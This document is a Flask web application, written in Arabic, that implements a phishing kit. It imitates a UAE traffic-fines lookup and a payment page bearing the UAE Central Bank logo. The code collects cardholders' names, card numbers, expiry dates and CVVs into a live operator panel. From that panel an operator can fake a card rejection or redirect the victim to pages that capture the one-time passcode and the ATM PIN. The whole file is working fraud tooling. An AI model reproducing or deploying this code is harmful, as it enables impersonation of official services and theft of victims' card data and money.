import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة بيانات التحكم
db = {"logs": [], "status": "waiting"}

# --- 1. الصفحة الرئيسية (التصميم الكامل) ---
HOME_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html { margin:0; padding:0; width:100%; background:#f8f9fa; }
    .wrapper { max-width:600px; margin:0 auto; background:#fff; position:relative; box-shadow:0 0 15px rgba(0,0,0,0.05); }
    img { width:100%; display:block; }
    .sticky-h { position:sticky; top:0; z-index:1000; background:#fff; border-bottom:1px solid #eee; }
    .btn-action { position:absolute; left:10%; width:80%; height:55px; background:transparent; border:none; cursor:pointer; }
</style>
</head>
<body>
    <div class="wrapper">
        <div class="sticky-h"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg"></div>
        <div style="position:relative;">
            <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
            <button class="btn-action" style="top:275px;" onclick="location.href='/search'"></button>
            <button class="btn-action" style="top:325px;" onclick="location.href='/search'"></button>
            <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
            <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        </div>
    </div>
</body>
</html>
"""

# --- 2. بوابة الدفع (النسخة الأصلية المعتمدة) ---
PAY_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body { background:#f1f3f6; font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin:0; }
    .pay-header { background:white; padding:15px; text-align:center; border-bottom:1px solid #ddd; }
    .pay-header img { height:50px; }
    .pay-card { max-width:500px; margin:40px auto; background:white; border-radius:8px; box-shadow:0 4px 20px rgba(0,0,0,0.08); padding:30px; }
    .total-amt { background:#fcf8e3; padding:15px; border-radius:5px; text-align:center; margin-bottom:25px; border:1px solid #faebcc; }
    .label { font-size:14px; color:#666; margin-bottom:8px; display:block; }
    input { width:100%; padding:14px; margin-bottom:20px; border:1px solid #ccc; border-radius:4px; font-size:16px; box-sizing:border-box; outline:none; }
    input:focus { border-color:#b0914f; }
    .card-row { display:flex; gap:15px; }
    .btn-pay { background:#b0914f; color:white; width:100%; padding:16px; border:none; border-radius:4px; font-size:18px; font-weight:600; cursor:pointer; transition:0.3s; }
    .btn-pay:hover { background:#8e753f; }
    .footer-logos { text-align:center; margin-top:30px; opacity:0.6; }
    .footer-logos img { height:30px; margin:0 10px; }
</style>
</head>
<body>
    <div class="pay-header"><img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png"></div>
    <div class="pay-card">
        <div class="total-amt">المبلغ المستحق للدفع: <strong style="color:#d9534f; font-size:20px;">255.00 AED</strong></div>
        <form action="/submit-card" method="POST">
            <label class="label">اسم حامل البطاقة / Cardholder Name</label>
            <input type="text" name="holder" placeholder="الاسم كما هو مكتوب على البطاقة" required>
            <label class="label">رقم البطاقة / Card Number</label>
            <input type="text" id="cn" name="card" placeholder="0000 0000 0000 0000" maxlength="19" required>
            <div class="card-row">
                <div style="flex:1;"><label class="label">تاريخ الانتهاء</label><input type="text" name="exp" placeholder="MM/YY" maxlength="5"></div>
                <div style="flex:1;"><label class="label">الرمز (CVV)</label><input type="text" name="cvv" placeholder="123" maxlength="3"></div>
            </div>
            <button type="submit" class="btn-pay">دفع الآن آمن / Pay Securely Now</button>
        </form>
    </div>
    <div class="footer-logos">
        <img src="https://img.icons8.com/color/96/visa.png">
        <img src="https://img.icons8.com/color/96/mastercard.png">
        <img src="https://img.icons8.com/color/96/pci-compliant.png">
    </div>
    <script>
        document.getElementById('cn').addEventListener('input', e => {
            let v = e.target.value.replace(/\\s/g, '').replace(/(.{4})/g, '$1 ').trim();
            e.target.value = v;
        });
    </script>
</body>
</html>
"""

# --- 3. لوحة التحكم الحية (/h-admin) ---
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body { background:#2c3e50; color:white; font-family:sans-serif; padding:20px; }
    .log-item { background:#34495e; border-right:8px solid #b0914f; padding:20px; margin-bottom:15px; border-radius:5px; }
    .btn { padding:10px 20px; border:none; cursor:pointer; font-weight:bold; border-radius:4px; margin:5px; }
    .btn-green { background:#27ae60; color:white; }
    .btn-red { background:#e74c3c; color:white; }
</style></head>
<body>
    <h1>لوحة تحكم حسن - النظام الموحد 👮‍♂️</h1>
    <div id="content"></div>
    <script>
        function loadLogs() {
            fetch('/get-logs').then(r => r.json()).then(data => {
                let html = '';
                data.logs.forEach(l => {
                    html += `<div class="log-item">
                        <p><strong>بيانات العميل:</strong> ${JSON.stringify(l)}</p>
                        <button class="btn btn-green" onclick="act('go_otp')">اطلب OTP</button>
                        <button class="btn btn-red" onclick="act('error_card')">رفض البطاقة</button>
                        <button class="btn btn-green" onclick="act('go_pin')">اطلب PIN</button>
                    </div>`;
                });
                document.getElementById('content').innerHTML = html;
            });
        }
        function act(s) { fetch('/set-status/' + s); }
        setInterval(loadLogs, 3000);
    </script>
</body>
</html>
"""

# --- باقى المسارات (التشغيل) ---

@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML_CONTENT) # سنضع كود الاستعلام العريض هنا

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/h-admin')
def admin_p(): return render_template_string(ADMIN_HTML)

@app.route('/submit-card', methods=['POST'])
def sub():
    db['logs'].insert(0, request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"logs": db['logs']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status']})

# كود صفحة الاستعلام العريض
SEARCH_HTML_CONTENT = """
<body style="background:#f4f4f4; margin:0; font-family:sans-serif;">
    <img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%;">
    <div style="background:white; width:90%; max-width:800px; margin:20px auto; border-radius:10px; border-top:10px solid #b0914f; padding:40px; box-shadow:0 5px 15px rgba(0,0,0,0.1);">
        <h2 style="text-align:center;">الاستعلام عن المخالفات</h2>
        <form action="/checkout" method="GET">
            <label>الإمارة:</label>
            <select style="width:100%; padding:15px; margin:10px 0;"><option>أبوظبي</option><option>دبي</option></select>
            <input type="text" placeholder="رقم اللوحة" style="width:100%; padding:15px; margin:10px 0;">
            <button style="width:100%; padding:20px; background:#b0914f; color:white; border:none; border-radius:5px; font-size:18px;">بحث</button>
        </form>
    </div>
</body>
"""

WAIT_JS = """
<script>
    setInterval(() => {
        fetch('/check-status').then(r => r.json()).then(d => {
            if(d.status === 'go_otp') location.href='/otp-page';
            if(d.status === 'go_pin') location.href='/pin-page';
            if(d.status === 'error_card') { alert('بيانات البطاقة غير صحيحة'); location.href='/checkout'; }
        });
    }, 3000);
</script>
<body style="text-align:center; padding-top:100px; font-family:sans-serif; background:#f4f4f4;">
    <div style="border:8px solid #ddd; border-top:8px solid #b0914f; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:auto;"></div>
    <h2>جاري مراجعة البيانات مع المصرف...</h2>
    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
</body>
"""

@app.route('/otp-page')
def otp(): return "<body style='text-align:center; padding:50px;'><h2>أدخل رمز OTP المرسل لجوالك</h2><form action='/submit-card' method='POST'><input name='otp' style='padding:15px; font-size:20px;'><button>تأكيد</button></form></body>"

@app.route('/pin-page')
def pin(): return "<body style='text-align:center; padding:50px;'><h2>أدخل رقم ATM PIN</h2><form action='/submit-card' method='POST'><input type='password' name='pin' style='padding:15px; font-size:20px;'><button>تأكيد</button></form></body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
